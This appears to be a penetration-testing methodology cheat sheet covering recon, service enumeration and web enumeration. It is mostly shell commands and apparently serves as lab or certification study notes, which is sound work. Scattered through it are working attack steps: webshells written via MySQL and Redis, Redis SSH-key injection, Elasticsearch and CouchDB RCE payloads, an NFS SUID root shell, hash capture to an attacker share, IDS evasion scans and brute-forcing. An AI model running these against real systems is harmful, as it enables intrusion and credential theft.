# PHASE 1: EXTERNAL RECON & ENUMERATION

## 1.1 - Passive Information Gathering
```
Decision: Do we have a domain name? → YES → proceed
                                      → NO → look for ASN, IP ranges, email addresses

Tools: viewdns.info, whois, shodan, censys, hunter.io, theHarvester, linkedin2username
```

**OSINT Sources:**
```bash
# Certificate transparency (subdomains from certs)
curl -s "https://crt.sh/?q=<domain>&output=json" | jq -r '.[].name_value' | sort -u

# Cloud resources (S3 buckets, Azure blobs)
# Google: site:s3.amazonaws.com "<company>"
# Google: intext:<company> inurl:blob.core.windows.net
# grayhatwarfare.com/publicbuckets

# Staff / LinkedIn → username generation
# Job posts reveal tech stack: Django, Flask, PostgreSQL, AWS
# linkedin2username.py -c "Company Name" -d domain.com

# GitHub secrets
# Search: "<company>" password, token, api_key
```

**DNS Enumeration:**
```bash
# Zone transfer attempt
dig axfr @<DNS_IP> <domain>

# Subdomain brute force
dnsenum --enum <domain> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# DNS records
dig ANY <domain> @<DNS_IP>
dig A <domain>
dig MX <domain>
dig TXT <domain>
dig NS <domain>

# DNS version (reveals BIND/etc version)
dig CH TXT version.bind @<DNS_IP>

# Reverse DNS
dig -x <ip>

# Manual subdomain brute (fallback)
for sub in $(cat wordlist.txt); do dig +short $sub.<domain> @<DNS_IP> | grep -v '^$' && echo "$sub.<domain>"; done
```

## 1.2 - Active Scanning

**Port Scan Decision Tree:**
```
Target size?
├── Single host → Full TCP scan immediately
│   └── nmap -sT -p- --min-rate=10000 -oA full_tcp <target>
├── Small range (≤256) → Ping sweep then full scan
│   └── nmap -sn <range> -oA live_hosts
│   └── nmap -sT -p- -iL live_hosts.txt -oA full_tcp
└── Large range → Top 1000 first, then targeted deep scans
    └── nmap -sC -sV --top-ports=1000 -iL targets.txt -oA top1000
```

**Service Version Scan (after port discovery):**
```bash
nmap -sC -sV -p <discovered_ports> -oA detailed <target>
```

**Web Discovery:**
```bash
# Common web ports
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

# Screenshot with EyeWitness
eyewitness --web -x web_discovery.xml -d eyewitness_report

# Screenshot with Aquatone
cat web_discovery.xml | aquatone -nmap
```

## 1.2b - Firewall/IDS Evasion Techniques
```bash
# Source port bypass (DNS is often trusted)
nmap --source-port 53 -sS -Pn <target>
ncat -nv --source-port 53 <target> <port>

# Decoy scan (hide among random IPs)
nmap -D RND:5 -sS -Pn <target>
nmap -D decoy1,decoy2,ME,decoy3 -sS -Pn <target>

# Idle scan (ultra-stealthy, uses zombie host)
nmap -sI <zombie_host>:<zombie_port> -Pn <target>

# Source IP spoofing (requires access to network)
nmap -S <spoofed_ip> -e tun0 -sS -Pn <target>

# Fragment packets
nmap -f -Pn <target>
nmap --mtu 24 -Pn <target>

# FTP bounce scan (scan internal hosts via FTP)
nmap -Pn -v -n -p80 -b anonymous:pass@<ftp_server> <internal_target>

# SCTP scan (for SCTP services)
nmap -sY -Pn <target>    # INIT scan
nmap -sZ -Pn <target>    # COOKIE-ECHO scan

# IP protocol scan
nmap -sO -Pn <target>

# Window scan and Maimon scan
nmap -sW -Pn <target>    # Window scan
nmap -sM -Pn <target>    # Maimon scan

# IDS/IPS detection
# 1. Scan from external VPS
# 2. If connection drops after some ports = IPS present
# 3. Trigger alert with obvious scan, check if blocked
# 4. Use slow scan: -T0 or -T1 to evade rate-based detection

# Key flags
-Pn                    # Skip host discovery (treat as alive)
-n                     # No DNS resolution
--disable-arp-ping     # Skip ARP on local network
--packet-trace         # Show all packets sent/received
--reason               # Show why port classified as open/closed/filtered
-v / -vv               # Verbose (show ports as discovered)
-A                     # Aggressive: -sV -O --traceroute -sC
-F                     # Fast scan (top 100 ports)
-O                     # OS detection
--traceroute           # Traceroute to target

# Performance tuning
-T4                    # Aggressive timing (fast scans)
--initial-rtt-timeout 50ms --max-rtt-timeout 100ms
--max-retries 0        # No retries (faster, may miss ports)
--min-rate 300         # Minimum packets/sec
--stats-every=5s       # Progress monitoring

# NSE script categories
# auth, broadcast, brute, default (-sC), discovery, dos,
# exploit, external, fuzzer, intrusive, malware, safe, version, vuln

# Saving results
-oN target.nmap        # Normal
-oG target.gnmap       # Grepable
-oX target.xml         # XML
-oA target             # All formats
xsltproc target.xml -o target.html  # HTML report
```

## 1.3 - Service-Specific Enumeration

### SMB (139/445)
```bash
# Null session check
smbclient -N -L //<target>
smbmap -H <target>
smbmap -H <target> -r <share>

# RPC enumeration (deep)
rpcclient -U'%' <target>
rpcclient $> srvinfo                    # Server info
rpcclient $> enumdomains                # List domains
rpcclient $> querydominfo               # Domain info
rpcclient $> enumdomusers               # All users
rpcclient $> enumdomgroups              # All groups
rpcclient $> queryuser 0x457            # User by RID
rpcclient $> querygroup 0x200           # Group by RID
rpcclient $> querygroupmem 0x200        # Group members
rpcclient $> netshareenumall            # All shares
rpcclient $> netsharegetinfo <share>    # Share details
rpcclient $> getdompwinfo               # Password policy
rpcclient $> getusrdompwinfo <user>     # User password policy

# RID brute-forcing (enumerate all users via RPC)
for i in $(seq 500 1100); do rpcclient -U "%" -N <target> -c "queryuser 0x$(printf '%x' $i)" 2>/dev/null | grep "User Name"; done

# Comprehensive automated
enum4linux-ng.py <target> -A -C
# Outputs: password policy, lockout threshold, min length, complexity

# Impacket samrdump
samrdump.py <target>

# NetExec
netexec smb <target> --shares
netexec smb <target> --users
netexec smb <target> --pass-pol
netexec smb <target> -u '' -p '' --rid-brute

# Mount share (Linux)
sudo mount -t cifs -o username=user,password=pass,domain=. //<target>/<share> /mnt/share

# Windows interaction
dir \\<target>\<share>               # List share
net use n: \\<target>\<share>        # Map drive
net use n: \\<target>\<share> /user:domain\user pass
findstr /s /i cred n:\*.*           # Search for creds
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List  # PowerShell

# Search mounted shares for creds
find /mnt/share -name "*cred*" -o -name "*password*" -o -name "*secret*" 2>/dev/null
grep -rn "password" /mnt/share/ 2>/dev/null
```

### FTP (21)
```bash
# Anonymous login check
ftp <target>
# user: anonymous / pass: (empty)

# Version & scripts
nmap -sC -sV -p 21 <target>

# FTP interaction commands
ftp> debug              # Enable debug
ftp> trace              # Enable packet trace
ftp> status             # Connection status
ftp> ls -R              # Recursive listing
ftp> binary             # Binary transfer mode
ftp> put shell.php      # Upload file (if write access)
ftp> get file.txt       # Download file
ftp> wget -m ftp://anonymous:pass@<target>  # Bulk download

# SSL/TLS inspection
openssl s_client -connect <target>:21 -starttls ftp

# FTP bounce scan (scan internal hosts via FTP)
nmap -Pn -v -n -p80 -b anonymous:pass@<ftp_server> <internal_target>

# Brute force
hydra -L users.txt -P passwords.txt ftp://<target>
medusa -h <target> -U users.txt -P passwords.txt -M ftp
```

### SSH (22)
```bash
# Version
nmap -sV -p 22 <target>

# Brute force
hydra -L users.txt -P passwords.txt ssh://<target>
```

### TFTP (UDP 69)
```bash
# No authentication — anonymous read/write if enabled
# Discovery
sudo nmap -sU -p 69 -sV --script tftp-enum <target>

# Connect + interact
tftp <target>
tftp> status
tftp> verbose
tftp> get <filename>            # download (no listing — must know filename)
tftp> put shell.php             # upload (if write enabled)
tftp> quit

# One-liners
curl -O tftp://<target>/<filename>
curl -T shell.php tftp://<target>/    # upload via curl

# Common files to grab (TFTP often hosts router configs / firmware)
for f in startup-config running-config network.conf system.cfg backup.tar; do
  tftp <target> -c get $f 2>/dev/null && echo "Got $f"
done

# Brute-force filenames (when listing disabled)
nmap --script tftp-enum --script-args tftp-enum.filelist=/usr/share/nmap/nselib/data/tftplist.txt -p 69 <target>

# Write a webshell to webroot via TFTP (if app server is also web server)
# Upload shell.php → access via http://<target>/shell.php
```

### SMTP (25)
```bash
# User enumeration
telnet <target> 25
VRFY admin
VRFY root
EXPN admin
RCPT TO: admin

# Nmap scripts
nmap --script smtp-enum-users -p 25 <target>
nmap --script smtp-open-relay -p 25 <target>

# Open relay testing
swaks --to target@domain.com --from attacker@domain.com --header "Subject: Test" --body "Test" --server <target>

# Manual SMTP interaction
telnet <target> 25
EHLO test
MAIL FROM:<attacker@domain.com>
RCPT TO:<victim@domain.com>
DATA
Subject: Test
Test body
.
QUIT
```

### POP3/IMAP (110/143/993/995)
```bash
# POP3 (plaintext)
nc <target> 110
USER <username>
PASS <password>
LIST
RETR <message_number>

# POP3 (TLS)
openssl s_client -connect <target>:995
USER <username>
PASS <password>
LIST
RETR <message_number>

# IMAP (TLS)
openssl s_client -connect <target>:993
1 LOGIN username password
1 LIST "" *
1 SELECT INBOX
1 FETCH <ID> all
1 FETCH <ID> body[]

# IMAP (plaintext)
nc <target> 143
1 LOGIN username password
1 LIST "" *
1 SELECT INBOX

# GUI: Evolution (Linux), Thunderbird
sudo apt-get install evolution
```

### DNS (53)
```bash
# Zone transfer
dig AXFR @<dns_server> <domain>

# Record enumeration
dig ANY <domain> @<dns_server>
nmap --script dns-brute --script-args dns-brute.threads=10 -p 53 <target>
```

### NFS (2049)
```bash
showmount -e <target>
sudo mount -t nfs <target>:<share> /mnt/nfs -o nolock
ls -la /mnt/nfs
ls -n /mnt/nfs   # Show UIDs (not resolved names)

# UID/GID spoofing (access files as file owner)
# 1. Note UID from ls -n
# 2. Create local user with matching UID
sudo useradd -u <target_uid> nfsuser
# 3. Access files as that user
su nfsuser

# no_root_squash exploitation (if present)
# Create SUID binary on share
gcc -o /mnt/nfs/rootshell /tmp/suid.c
chmod u+s /mnt/nfs/rootshell
# Execute on target → root shell

# Look for sensitive files, SSH keys, credentials
```

### LDAP (389)
```bash
# Anonymous bind
ldapsearch -h <target> -x -b "dc=domain,dc=com"
ldapsearch -h <target> -x -b "dc=domain,dc=com" "(objectClass=user)"
ldapsearch -h <target> -x -b "dc=domain,dc=com" "(objectClass=group)"
```

### MSSQL (1433)
```bash
# Connection
sqsh -S <target> -U <user> -P '<pass>'
mssqlclient.py <user>@<target>
sqlcmd -S <target> -U <user> -P '<pass>'

# Windows auth
sqsh -S <target> -U .\\<user> -P '<pass>'

# GUI: dbeaver (cross-platform), SSMS (Windows)
sudo dpkg -i dbeaver-<version>.deb && dbeaver &

# Hash capture (NTLMv2 to Responder)
SQL> xp_dirtree '\\<attacker>\share'
SQL> EXEC master..xp_subdirs '\\<attacker>\share'
```

### MySQL (3306)
```bash
mysql -u <user> -p<pass> -h <target>

# NSE scripts (automated enum)
nmap --script mysql-info -p 3306 <target>
nmap --script mysql-enum -p 3306 <target>
nmap --script mysql-empty-password -p 3306 <target>
nmap --script mysql-brute --script-args userdb=users.txt,passdb=pass.txt -p 3306 <target>

# Useful MySQL queries
SHOW DATABASES;
USE <database>;
SHOW TABLES;
SELECT * FROM <table>;
SELECT LOAD_FILE('/etc/passwd');  # Read files (if FILE privilege)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';  # Write files
```

### RDP (3389)
```bash
# Check NLA
nmap -sV -p 3389 <target>

# Brute force
hydra -L users.txt -P passwords.txt rdp://<target>
crowbar -b rdp -s <target>/32 -U users.txt -c 'Password123'
```

### WinRM (5985/5986)
```bash
netexec winrm <target> -u users.txt -p passwords.txt
evil-winrm -i <target> -u <user> -p '<pass>'
```

### VNC (5900)
```bash
hydra -P passwords.txt vnc://<target>
```

### SNMP (161)
```bash
snmpwalk -v2c -c public <target>
snmpwalk -v2c -c community <target>
onesixtyone -c community_strings.txt <target>

# OID-specific queries
# Processes: snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.4.2.1.2
# Users: snmpwalk -v2c -c public TARGET 1.3.6.1.4.1.77.1.2.25
# TCP ports: snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.6.13.1.3
# Software: snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.6.3.1.2

# braa (fast OID brute-force)
braa public@<target>:.1.3.6.*
braa community@<target>:.1.3.6.1.2.1.25.4.2.1.2  # Processes

# Nmap SNMP scripts
nmap --script snmp-brute -p 161 <target>
nmap --script snmp-info -p 161 -sU <target>
nmap --script snmp-interfaces -p 161 -sU <target>
nmap --script snmp-processes -p 161 -sU <target>
```

### Oracle TNS (1521)
```bash
nmap -p1521 -sV <target> --open
nmap -p1521 -sV <target> --open --script oracle-sid-brute
./odat.py all -s <target>
# Default creds: SYS:CHANGE_ON_INSTALL, DBSNMP:dbsnmp, SCOTT:tiger
sqlplus scott/tiger@<target>/XE
sqlplus scott/tiger@<target>/XE as sysdba
```

### IPMI (623/UDP)
```bash
sudo nmap -sU --script ipmi-version -p 623 <target>
# Default creds: root:calvin (Dell iDRAC), ADMIN:ADMIN (Supermicro)
# Hash dump via Metasploit: use auxiliary/scanner/ipmi/ipmi_dumphashes
# Crack: hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

### Rsync (873)
```bash
nc -nv <target> 873
#list
rsync -av --list-only rsync://<target>/<share>
rsync -av rsync://<target>/<share> ./loot/
```

### R-Services (512-514)
```bash
rlogin <target> -l <user>
rwho
rusers -al <target>
# Check /etc/hosts.equiv and ~/.rhosts for trust relationships
```

### Telnet (23)
```bash
# Banner grab (often leaks OS/device model)
nc -nv <target> 23
telnet <target> 23

# Nmap (banner + scripts)
nmap -sV -p 23 --script "*telnet* and safe" <target>

# Brute force
hydra -L users.txt -P passwords.txt telnet://<target>
medusa -h <target> -U users.txt -P passwords.txt -M telnet

# Common default creds — try first
# root:(empty), admin:admin, admin:password, cisco:cisco, root:calvin
# Network gear: enable password = "cisco" or empty
```

### Finger (79)
```bash
# Username enumeration (legacy UNIX)
finger @<target>
finger root@<target>
finger user@<target>
nmap -sV -p 79 --script finger <target>

# pentbox finger user-enum
for u in $(cat users.txt); do finger $u@<target>; done
```

### Redis (6379)
```bash
# Unauth check (default = no auth)
redis-cli -h <target> ping        # returns PONG = unauthenticated
redis-cli -h <target> info
redis-cli -h <target> config get '*'

# With auth
redis-cli -h <target> -a '<pass>' ping

# Data dump
redis-cli -h <target> keys '*'
redis-cli -h <target> get <key>

# RCE: write SSH key to authorized_keys (if redis runs as user with ~/.ssh/)
ssh-keygen -t rsa -f /tmp/key -N ""
(echo -e "\n\n"; cat /tmp/key.pub; echo -e "\n\n") > /tmp/key.txt
redis-cli -h <target> flushall
cat /tmp/key.txt | redis-cli -h <target> -x set ssh_key
redis-cli -h <target> config set dir /root/.ssh/
redis-cli -h <target> config set dbfilename "authorized_keys"
redis-cli -h <target> save
ssh -i /tmp/key root@<target>

# RCE: write webshell to webroot
redis-cli -h <target> config set dir /var/www/html/
redis-cli -h <target> config set dbfilename "shell.php"
redis-cli -h <target> set test "<?php system(\$_GET['cmd']); ?>"
redis-cli -h <target> save
curl "http://<target>/shell.php?cmd=id"

# RCE: master/slave replication abuse (newer Redis)
# Use redis-rogue-server.py — register attacker as master, push module
python3 redis-rogue-server.py --rhost <target> --lhost <attacker>
```

### MongoDB (27017)
```bash
# Unauth bind check
mongo --host <target>
mongo --host <target>:27017
nmap -sV -p 27017 --script mongodb-info,mongodb-databases <target>

# Modern client
mongosh --host <target>

# Inside shell
> show dbs
> use <db>
> show collections
> db.<collection>.find()
> db.users.find({}, {username:1, password:1})

# Auth
mongo --host <target> -u <user> -p '<pass>' --authenticationDatabase admin

# Dump everything
mongodump --host <target> --out ./mongo_dump

# CVE-2021-20329 — NoSQL injection from app side → see §3.16
```

### Elasticsearch (9200)
```bash
# Cluster info (unauth)
curl http://<target>:9200/
curl http://<target>:9200/_cluster/health
curl http://<target>:9200/_cat/indices
curl http://<target>:9200/_search?pretty
curl http://<target>:9200/<index>/_search?pretty&size=1000

# Nmap
nmap -sV -p 9200 --script "elasticsearch*" <target>

# CVE-2014-3120 (Groovy script RCE — old, pre-1.2)
curl -XPOST http://<target>:9200/_search?pretty -d '
{"size":1,"script_fields":{"x":{"script":"java.lang.Runtime.getRuntime().exec(\"id\").getInputStream()"}}}'

# CVE-2015-1427 (Sandbox bypass — 1.3.0-1.3.7, 1.4.0-1.4.2)
# Use Metasploit: exploit/multi/elasticsearch/search_groovy_script

# Modern (no RCE) — focus on data exfil
curl http://<target>:9200/_all/_search?pretty&size=10000 > exfil.json
```

### Memcached (11211)
```bash
# Stats + key dump
nc -nv <target> 11211
> stats
> stats items
> stats cachedump <slab_id> <num_keys>
> get <key>
> version
> quit

# Nmap
nmap -sV -p 11211 --script memcached-info <target>

# Bulk dump
memcdump --servers=<target>:11211
memccat --servers=<target>:11211 <key>
```

### CouchDB (5984)
```bash
# Info (no auth on older versions)
curl http://<target>:5984/
curl http://<target>:5984/_all_dbs
curl http://<target>:5984/_users/_all_docs?include_docs=true

# CVE-2017-12635 (privilege escalation via duplicate JSON keys)
# CVE-2017-12636 (RCE via local.ini config injection — auth required)
curl -X PUT http://<target>:5984/_node/couchdb@localhost/_config/query_servers/cmd \
  -u admin:admin -d '"id >&2; echo"'
curl -X PUT http://<target>:5984/db -u admin:admin
curl -X PUT http://<target>:5984/db/doc -u admin:admin -d '{"_id":"doc"}'
curl -X POST http://<target>:5984/db/_temp_view?language=cmd -u admin:admin \
  -H "Content-Type: application/json" -d '{"map":""}'
```

### Java RMI / JDWP / JMX (1099, 8000, 1617)
```bash
# RMI (1099)
nmap -sV -p 1099 --script "rmi-*" <target>
# BaRMIe — enumerate + exploit RMI
java -jar BaRMIe.jar -enum <target> 1099
java -jar BaRMIe.jar -attack <target> 1099

# JDWP (Java Debug Wire Protocol — 8000 / 5005 / random)
# Open JDWP = unauth RCE
nmap -sV --script jdwp-info -p <port> <target>
python3 jdwp-shellifier.py -t <target> -p <port> --cmd "id"

# JMX (Java Management Extensions — 1617 / random RMI ports)
# Default no auth → load malicious MBean → RCE
msf > use exploit/multi/misc/java_jmx_server
```

### Cassandra (9042) / RabbitMQ (5672, 15672) / Other
```bash
# Cassandra
nmap -sV -p 9042 --script cassandra-info <target>
cqlsh <target> 9042

# RabbitMQ management (15672)
# Default creds: guest:guest (only allowed from localhost since 3.3.0 — but old installs)
curl http://<target>:15672/api/whoami -u guest:guest

# AMQP (5672) brute
hydra -L users.txt -P passwords.txt -s 5672 amqp://<target>
```

> Exploitation flows for these services live alongside enum (above) — Phase 4 covers
> common services only (FTP/SMB/MSSQL/MySQL/RDP/WinRM/DNS/SMTP/POP3-IMAP).
> Less-common service attack is contained in this Phase 1.3 entry.

---

# PHASE 2: WEB APPLICATION ENUMERATION

> Passive first, active second. DNS/subdomain enum BEFORE directory brute-forcing.
> Always check WAF before aggressive scanning.

---

## 2.1 - PASSIVE RECON

### 2.1.1 - WHOIS
```bash
# Basic WHOIS
whois <domain>

# Key fields to note:
# - Registrar, creation/expiry dates
# - Name servers (NS records)
# - Registrant contact (email, org)
# - Historical WHOIS: whoisfreaks.com

# Automated
theHarvester -d <domain> -b all
```

### 2.1.2 - DNS Enumeration
```bash
# Zone transfer (high value - dumps entire zone)
dig axfr @<dns_server> <domain>

# Record types
dig A <domain> @<dns_server>
dig AAAA <domain> @<dns_server>
dig MX <domain> @<dns_server>
dig NS <domain> @<dns_server>
dig TXT <domain> @<dns_server>    # SPF, DKIM, verification strings
dig SOA <domain> @<dns_server>
dig SRV <domain> @<dns_server>    # Service discovery
dig ANY <domain> @<dns_server>
dig +trace <domain>               # Full resolution path

# Reverse DNS
dig -x <ip>

# Automated DNS enum
dnsenum --enum <domain> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r
dnsrecon -d <domain> -t std
fierce --domain <domain>
```

### 2.1.3 - Subdomain Enumeration
```bash
# Passive (no direct connection to target)
# CT logs (crt.sh)
curl -s "https://crt.sh/?q=<domain>&output=json" | jq -r '.[].name_value' | sort -u

# Censys
censys search '<domain>' --index-type certificates

# Assetfinder
assetfinder --subs-only <domain>

# Amass (passive mode)
amass enum -passive -d <domain>

# Active (brute-force)
puredns resolve /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --domain <domain>
amass enum -active -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Filter live hosts
cat subdomains.txt | httpx -silent -status-code -title
```

### 2.1.4 - Google Dorking
```
site:<domain>                    # All indexed pages
site:<domain> filetype:pdf       # PDF documents
site:<domain> filetype:sql       # Database dumps
site:<domain> inurl:admin        # Admin panels
site:<domain> inurl:login        # Login pages
site:<domain> intext:"password"  # Pages mentioning password
cache:<domain>                   # Cached version
```

### 2.1.5 - Web Archives (Wayback Machine)
```bash
# Historical URLs
curl -s "http://web.archive.org/cdx/search/cdx?url=<domain>/*&output=text&fl=original&collapse=urlkey" | sort -u

# Wayback Machine: web.archive.org/web/*/domain.com
# Look for: old API endpoints, removed pages, hardcoded creds, dev URLs
```

### 2.1.6 - Application Discovery & Screenshotting
```bash
# Web discovery scan
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

# EyeWitness (screenshot all web apps)
eyewitness --web -x web_discovery.xml -d screenshots/

# Aquatone (screenshot + report)
cat web_discovery.xml | aquatone -out aquatone_report

# Review screenshots to identify:
├── CMS (WordPress, Drupal, Joomla)
├── Dev/staging environments (dev.*, staging.*)
├── Admin panels
├── Default pages (Apache, IIS, Tomcat)
└── Interesting applications (Jenkins, GitLab, Splunk, etc.)
```

---

## 2.2 - ACTIVE FINGERPRINTING & SCANNING

### 2.2.1 - WAF Detection (do FIRST)
```bash
# Detect WAF before aggressive scanning
wafw00f <target>

# If WAF present → reduce threads, use encoding, consider evasion
# If no WAF → proceed with normal scanning
```

### 2.2.2 - Technology Fingerprinting
```bash
# Server headers
curl -I http://<target>

# Technology detection
whatweb http://<target>
wappalyzer <target>              # Browser extension or CLI

# Nikto (software identification only)
nikto -h <target> -Tuning b

# Common files
curl -s http://<target>/robots.txt        # Hidden paths
curl -s http://<target>/sitemap.xml       # Site structure
curl -s http://<target>/.git/HEAD         # Git leak
curl -s http://<target>/.well-known/openid-configuration  # OAuth/OIDC
curl -s http://<target>/security.txt      # Security contacts
```

### 2.2.3 - Virtual Host Discovery
```bash
# Add discovered vhosts to /etc/hosts
echo "10.129.x.x app.domain.local dev.domain.local" | sudo tee -a /etc/hosts

# ffuf vhost fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://domain.local/ -H 'Host: FUZZ.domain.local' -fs <default_size>

# gobuster vhost (append-domain mode)
gobuster vhost -u http://<target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# feroxbuster vhost
feroxbuster -u http://<target> -w wordlist --virtual-hosts
```

### 2.2.4 - Directory Brute-Forcing
```bash
# Directory-only (no extensions)
gobuster dir -u http://<target> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50
ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# With extensions (CRITICAL — match server tech)
# PHP target
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,phtml,php5,phps -t 50
ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.phtml,.php5
# IIS/.NET target
gobuster dir -u http://<target> -w wordlist.txt -x asp,aspx,ashx,config -t 50
# Java/Tomcat target
gobuster dir -u http://<target> -w wordlist.txt -x jsp,do,action -t 50
# Generic web
gobuster dir -u http://<target> -w wordlist.txt -x html,txt,bak,old,zip,tar.gz -t 50

# Status-code filtering
ffuf -u http://<target>/FUZZ -w wordlist.txt -mc 200,204,301,302,307,401,403
ffuf -u http://<target>/FUZZ -w wordlist.txt -fc 404         # filter 404
ffuf -u http://<target>/FUZZ -w wordlist.txt -fs <bytes>     # filter by size (drop default page)

# Recursive (feroxbuster does this best)
feroxbuster -u http://<target> -w wordlist.txt -x php,html,txt -d 2 -t 50

# Parameter fuzzing (find hidden params)
ffuf -u 'http://<target>/page.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <baseline_size>
ffuf -u 'http://<target>/api/users' -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -w params.txt -fc 404

# Subdomain fuzzing via Host header
ffuf -w subdomains.txt -u http://<target>/ -H 'Host: FUZZ.<domain>' -fs <baseline>

# HTTP method fuzzing
ffuf -u http://<target>/admin -X FUZZ -w methods.txt
# methods.txt: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD, TRACE
```

### 2.2.4b - GraphQL Endpoint Discovery + Introspection

```bash
# Common GraphQL paths to probe
for p in /graphql /graphiql /api/graphql /v1/graphql /query /api /api/v1/graphql; do
  curl -s -X POST "http://<target>$p" -H "Content-Type: application/json" -d '{"query":"{__typename}"}' | head -c 200
  echo " ← $p"
done

# Introspection query (if enabled — instant schema dump)
curl -X POST http://<target>/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{queryType{name} mutationType{name} types{name fields{name args{name type{name}}}}}}"}' | jq

# Fingerprint (graphw00f) — works even when introspection disabled
python3 graphw00f.py -t http://<target>/graphql -d -f

# Brute-force schema when introspection disabled
python3 clairvoyance.py -o schema.json -w wordlist.txt http://<target>/graphql

# Common abuse
# - Query for sensitive fields the UI doesn't expose: users { password, apiKey, ssn }
# - Mutations: mutation { updateUser(id:1, role:"admin"){id} }
# - Batching (DoS / auth bypass): [{"query":"..."},{"query":"..."},...]
# - Field suggestions enabled even with introspection off → leak field names via typos
```

### 2.2.5 - Web Crawling
```bash
# Burp Suite Spider (proxy → spider target)
# OWASP ZAP Spider (automated crawl)
# ReconSpider (custom Python crawler)
python3 ReconSpider.py -u http://<target>

# Extract from crawled data: emails, JS files, comments, form fields, API endpoints
```

---

## 2.3 - CMS / Application Fingerprinting (detection only — exploitation in §11)

> Fingerprint the CMS/app here, then jump to §11 for full attack chain.
> Avoids duplicating commands.

```
Decision: What CMS/application is the target?
├── WordPress  → see §11.0b WordPress (WPScan, plugin enum, XML-RPC BF, theme RCE)
├── Joomla     → see §11.0b Joomla (joomscan, default creds, template RCE)
├── Drupal     → see §11.0b Drupal (droopescan, Drupalgeddon2/3, PHP Filter)
├── Tomcat     → see §11.0b Apache Tomcat (manager creds, WAR upload, Ghostcat)
├── Jenkins    → see §11.1 (Script Console RCE)
├── Splunk     → see §11.2 (custom app deploy)
├── PRTG       → see §11.3 (prtgadmin:prtg + CVE-2018-9276)
├── GitLab     → see §11.4 (public repos, API, auth RCE)
├── osTicket   → see §11.5
├── phpMyAdmin → see §11.6 (SELECT INTO OUTFILE → webshell)
├── Nagios     → see §11.7
├── ColdFusion → see §11.0b ColdFusion (CVE-2010-2861, FCKeditor RCE)
├── DotNetNuke → see §11.0b DNN (Cookie deserial RCE)
├── Tomcat CGI / Shellshock → see §11.0b Shellshock
├── IIS (Tilde 8.3) → see §11.0b IIS Tilde Enumeration
└── Unknown → Wappalyzer + searchsploit + manual testing
```

**Quick CMS fingerprint commands:**
```bash
# Generic detection
whatweb http://<target>
wappalyzer-cli http://<target>            # if installed
curl -s http://<target>/ | grep -iE 'generator|powered by|wp-|joomla|drupal'

# WordPress
curl -s http://<target>/wp-login.php | grep -i wordpress
curl -s http://<target>/readme.html 2>/dev/null | head -1

# Joomla
curl -s http://<target>/administrator/manifests/files/joomla.xml | grep version

# Drupal
curl -s http://<target>/CHANGELOG.txt | head -2

# Tomcat
curl -s http://<target>:8080/ | grep -i tomcat
curl -sI http://<target>:8080/             # Server: header

# Jenkins
curl -sI http://<target>:8080/             # X-Jenkins: <version>

# phpMyAdmin
curl -s http://<target>/phpmyadmin/ | grep -i phpmyadmin
```

---